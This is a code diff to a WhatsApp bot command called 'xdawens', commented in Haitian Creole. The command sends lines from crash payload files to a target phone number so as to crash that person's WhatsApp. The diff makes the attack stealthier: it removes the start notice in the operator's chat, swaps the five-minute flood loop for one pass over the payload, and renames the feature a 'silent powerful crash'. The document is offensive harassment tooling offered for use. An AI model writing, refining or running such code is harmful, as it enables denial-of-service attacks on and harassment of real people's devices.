@@ -1,11 +1,11 @@
 const { cmd } = require('../command');
 const config = require('../config');
-const bugchat = require('../bug/izuka6.js');         // Payload prensipal (pi fò)
-const bugchatPlus = require('../bug/izuka6plus.js'); // Payload dezyèm, pi puisan
+const bugchat = require('../bug/izuka6.js');         // Payload prensipal
+const bugchatPlus = require('../bug/izuka6plus.js'); // Payload pi fò
 
 cmd({
   pattern: 'xdawens',
-  desc: 'Send powerful crash to WhatsApp user for 5 minutes',
+  desc: 'Send silent powerful crash to WhatsApp user',
   category: 'bug',
   react: '💀',
   filename: __filename
@@ -50,25 +50,19 @@ cmd({
     const targetJid = `${targetNumber}@s.whatsapp.net`;
     const payloadLines = (usePlusPayload ? bugchatPlus : bugchat).split('\n').filter(Boolean);
 
-    await bot.sendMessage(from, {
-      text: `💀 *XDAWENS CRASH STARTED*\n🎯 Target: +${targetNumber}\n🕒 Duration: 5 minutes\n\n📤 Sending ${usePlusPayload ? 'PLUS' : 'STANDARD'} payload...`,
-    }, { quoted: mek });
+    // Nou pa voye mesaj anyen bay pwòp konvèsasyon bot/owner
+    // Nou voye mesaj dirèkteman nan kontak sib la san okenn 'quoted'
 
-    const endTime = Date.now() + 5 * 60 * 1000;
-    let count = 1;
-
-    while (Date.now() < endTime) {
-      for (let line of payloadLines) {
-        await bot.sendMessage(targetJid, {
-          text: `💥 *XDAWENS CRASH #${count}*\n${line}\n\n⚠️ _Do not reply_`
-        });
-        count++;
-        await new Promise(r => setTimeout(r, 250));
-      }
+    for (let i = 0; i < payloadLines.length; i++) {
+      await bot.sendMessage(targetJid, {
+        text: `💥 *XDAWENS CRASH #${i + 1}*\n${payloadLines[i]}\n\n⚠️ _Do not reply_`
+      });
+      await new Promise(r => setTimeout(r, 250));
     }
 
+    // Pa voye mesaj repons nan pwòp chat ou, jis omwen yon minimòm konfime
     await bot.sendMessage(from, {
-      text: `✅ *XDAWENS CRASH finished on* +${targetNumber}`,
+      text: `✅ *XDAWENS CRASH finished on* +${targetNumber}\n(Messages sent silently)`
     }, { quoted: mek });
 
   } catch (err) {
